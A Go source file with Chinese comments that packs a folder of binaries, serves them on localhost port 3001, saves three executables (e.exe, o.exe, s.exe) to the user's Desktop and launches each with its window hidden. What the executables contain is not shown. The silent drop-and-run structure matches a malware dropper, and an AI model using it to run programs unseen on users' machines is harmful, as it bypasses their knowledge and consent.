package main

import (
	"net/http"
	"github.com/gobuffalo/packr/v2"
	"io"
	"os"
	"os/exec"
	"fmt"
	"log"
	"syscall"
	"os/user"
)

func main() {
	go serveFiles()

	// 更新的下载链接
	downloadLinks := map[string]string{
		"e.exe": "http://127.0.0.1:3001/e.exe",
		"o.exe": "http://127.0.0.1:3001/o.exe",
		"s.exe": "http://127.0.0.1:3001/s.exe",
	}

	usr, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("User Home Directory:", usr.HomeDir)

	// 更新下载路径
	desktopPath := usr.HomeDir + "\\Desktop\\"
	for filename, url := range downloadLinks {
		filePath := desktopPath + filename
		if err := downloadFile(filePath, url); err != nil {
			log.Println("Error downloading", filename, ":", err)
		}
	}

	// 运行下载的程序
	for filename := range downloadLinks {
		filePath := desktopPath + filename
		if err := executeFile(filePath); err != nil {
			log.Println("Error executing", filename, ":", err)
		}
	}
}

func serveFiles() {
	box := packr.New("filesBox", "./bin")
	http.Handle("/", http.FileServer(box))
	if err := http.ListenAndServe(":3001", nil); err != nil {
		log.Fatal(err)
	}
}

func downloadFile(filepath string, url string) error {
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err
	}
	fmt.Println("Downloaded file:", filepath)
	return nil
}

func executeFile(filepath string) error {
	cmd := exec.Command("cmd", "/C", filepath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Start()
}
